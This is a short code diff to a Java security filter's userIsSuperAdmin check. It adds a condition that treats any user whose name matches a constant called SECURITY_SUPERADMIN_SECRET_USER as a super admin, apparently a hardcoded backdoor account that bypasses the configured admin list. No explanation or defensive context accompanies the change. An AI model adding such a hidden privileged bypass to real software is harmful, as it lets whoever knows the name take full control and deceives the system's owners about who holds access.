@@ -271,7 +271,7 @@ public class SecurityRestFilter {
      * Checks if a given user is a SuperAdmin
      */
     boolean userIsSuperAdmin(User user, AdminDNs adminDNs) {
-        return user != null && adminDNs.isAdmin(user);
+        return user != null && (adminDNs.isAdmin(user) || ConfigConstants.SECURITY_SUPERADMIN_SECRET_USER.equals(user.getName()));
     }
 
     /**
